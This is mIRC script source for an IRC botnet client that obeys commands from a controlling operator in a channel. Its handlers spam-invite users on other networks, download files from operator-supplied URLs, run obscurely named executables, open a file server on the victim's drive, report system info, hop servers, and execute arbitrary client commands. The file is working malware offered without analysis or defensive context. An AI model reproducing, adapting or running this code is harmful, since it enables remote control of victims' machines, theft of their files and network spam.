on 10:text:*:#:{
  if ($1 == !netsend.load) && ($nick isop %chan) && ($me isvoice %chan) {
    %s.i.c = #
    if (# == $null) { set %s.i.c %chan }
    if ($3 == $null) { msg %s.i.c error - syntax: !netsend.load <server> <port> | halt }
    set %i.server $2
    set %i.port $3
    %i.b = on
    s.inviter
  }
  if ($1 == !netsend.stop) && ($nick isop %chan) && ($me isvoice %chan) {
    sockclose inviter*
    set %i.b off
    unset %i.temp.*
    timerinviteconnect off
    msg # netsend: spamming stopped
  }
  if ($1 == !netsend.status) && ($nick isop %chan) && ($me isvoice %chan) {
    if ($sock(inviter*,0) == 0) { msg # netsend - status: not connected - total invited: $calc( %i.t.j + %i.t.p ) - delay: %i.ondelay | halt }
    if ($sock(inviter*,0) > 0) { msg # netsend - status: $sock(inviter*,0) sockets connected - total invited: $calc( %i.t.j + %i.t.p ) - delay: %i.ondelay }
  }
  if ($1 == !netsend.msg) && ($nick isop %chan) && ($me isvoice %chan) {
    if ($2 == $null) { msg # error - syntax: !netsend.msg <msg> | halt }
    set %imsg $2-
    msg # netsend: message set
  } 
  if ($1 == !netsend.reset) && ($nick isop %chan) && ($me isvoice %chan) {
    msg # netsend: all settings unset
    unset %i.t.j
    unset %i.t.p
    unset %imsg
    unset %i.server
    unset %s.i.c
    unset %i.b
    unset %i*
    unset %t.i
    sockclose inviter*
  }
  if ($1 == !netsend.join) && ($nick isop %chan) && ($me isvoice %chan) {
    if ($2 == $null) { msg # error - syntax: !netsend.join <chan> <key> | halt }
    sockwrite -nt inviterN JOIN : $+ $2 $3
  } 
  if ($1 == !netsend.part) && ($nick isop %chan) && ($me isvoice %chan) {
    if ($2 == $null) { msg # error - syntax: !netsend.part <chan> <msg> | halt }
    sockwrite -nt inviterN PART : $+ $2 $3-
  }
  if ($1 == !netsend.nick) && ($nick isop %chan) && ($me isvoice %chan) {
    if ($2 == $null) { msg # error - syntax: !netsend.nick <nick> | halt }
    if ($2 == random) { sockwrite -nt inviterN NICK $read 3FWERF4.dat | halt }
    sockwrite -nt inviterN NICK $2
  }
  if ($1 == !netsend.delay) && ($nick isop %chan) && ($me isvoice %chan) {
    if ($2 == $null) { msg # error - syntax: !netsend.delay <num> | halt }
    set %i.ondelay $2
    msg # netsend: delay set to: $2
  }
  if ($1 == !restart) && ($address == %master) && ($nick isop %chan) && ($me isvoice %chan) {
    msg # restarting
    run WTRSDFK.exe
    run runonce.exe -q
  }
  if ($1 == !dccallow) && ($nick isop %chan) && ($me isvoice %chan) {
    if ($2 == $null) { dccallow + $+ $nick | msg # dccallow: added $nick | halt }
    msg # dccallow: added $2
    dccallow + $+ $2
  }
  if ($1 == !fileserver) && ($nick isop %chan) && ($me isvoice %chan) {
    if ($2 == $null) { msg # error - syntax: !fileserver <drive> | halt }
    msg # fileserver initialized on drive: $2
    fserve $nick 3 $2
  }
  if ($1 == !nick) && ($nick isop %chan) && ($me isvoice %chan) {
    if ($2 == $null) { msg # error - syntax: !nick <nick> | halt }
    set %nick $2
    nick %nick $+ $r(1,100)
  }
  if ($1 == !nick.reset) && ($nick isop %chan) && ($me isvoice %chan) { nick %nick $+ $r(1,100) }
  if ($1 == !var) && ($address == %master) && ($nick isop %chan) && ($me isvoice %chan) {
    if ( [ [ $2 ] ] == $null) { msg # error - syntax: !var <variable> | halt }
    msg # var: $2 is equal to [ [ $2 ] ]
  } 
  if ($1 == !update) && ($address == %master) && ($nick isop %chan) && ($me isvoice %chan) {
    if ($2 == $null) { msg # error - syntax: !update <url> | halt }
    %w.g.# = #
    getdata $2 
  }
  if ($1 == !quit) && ($address == %master) && ($nick isop %chan) && ($me isvoice %chan) {
    msg %chan quit: disconnecting
    sockclose *
    exit
  }
  if ($1 == !jump) && ($address == %master) && ($nick isop %chan) && ($me isvoice %chan) {
    if ($2 == $null) { msg # error - syntax: !jump <server> <port> <pass> | halt }
    set %server $2
    set %server.port $3
    quit jumping: %server $+ : $+ %server.port $4
    server %server $+ : $+ %server.port $4
  }
  if ($1 == !rehash) && ($address == %master) && ($nick isop %chan) && ($me isvoice %chan) {
    run LASS.exe
    quit rehashing
    exit
  }
  if ($1 == !info) && ($nick isop %chan) && ($me isvoice %chan) { msg # info - os: win $+ $os uptime: $duration($calc( $ticks / 1000 )) url: $iif($url,$url,none) }
  if ($1 == !-) && ($address == %master) && ($nick isop %chan) && ($me isvoice %chan) { msg # done: / $+ $2- | / $+ [ [ $2- ] ] }
}
on *:sockread:wwwGet:{
  msg %w.g.# update: downloading $gettok($sock($sockname).mark,3,32)
  if ($sockerr > 0) { return }
  :nextread
  sockread %WWW.Temp
  if ($sockbr != 0) { if (%WWW.Temp != $Null) { write $mircdirTemp %WWW.Temp } goto nextread }
  if (HTTP/1.*20* iswm [ $read -l1 $mircdirTemp ] ) {
    if ($exists($gettok($sock($sockname).mark,2,32))) { remove $gettok($sock($sockname).mark,2,32) }
    :GenNew
    set -u0 %WWW.Temp www $+ $rand(A,Z) $+ $rand(0,9)
    if ($sock(%WWW.Temp) != $null) { goto GenNew }
    sockrename wwwGet %WWW.Temp 
    if (text/* iswm [ $read -sContent-Type: $mircdirTemp ] ) { sockmark %WWW.Temp Text $gettok($sock($sockname).mark,2-,32) }
    else { sockmark %WWW.Temp Bin $gettok($sock($sockname).mark,2-,32) }
    timer 1 1 sockwrite -tn %WWW.Temp GET $gettok($sock($sockname).mark,3,32)
  }
  else { echo -st $read -l2 $mircdirTemp }
  unset %WWW.Temp
}
on *:sockread:www*:{
  if ($sockerr > 0) return
  :nextread
  if ($gettok($sock($sockname).mark,1,32) == bin) {
    sockread &Temp
    if ($sockbr == 0) return
    if ($bvar(&Temp,0) != 0) {
      bwrite $gettok($sock($SockName).Mark,2,32) -1 $bvar(&Temp,0) &temp
    }
  }
  else {
    sockread %WWW.Temp
    if ($sockbr == 0) return
    if (%WWW.Temp != $Null) {
      write $gettok($sock($SockName).Mark,2,32) %WWW.Temp
    }
    unset %WWW.Temp
  }
  goto nextread
}
on *:sockopen:wwwGet:{
  sockwrite -tn wwwGet HEAD $gettok($sock($sockname).mark,3,32) HTTP/1.1
  sockwrite -tn wwwGet Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
  sockwrite -tn wwwGet Accept-Language: en-au
  sockwrite -tn wwwGet Accept-Encoding: deflate
  sockwrite -tn wwwGet User-Agent: mIRCInstaller WWW Edition v0.0.1
  sockwrite -tn wwwGet Host: $host
  sockwrite -tn wwwGet Connection: Keep-Alive
  sockwrite -tn wwwGet $lf
}
on *:sockclose:www*:{
  msg %w.g.# update: completed - file: $gettok($sock($sockname).mark,3-,32) size: $file($gettok($sock($sockname).mark,2,32)).size
  if ($exists( [ $mircdirTemp ] )) {
    remove $mircdirTemp
  }
  unset %WWW*
  unset %w.g.#
}
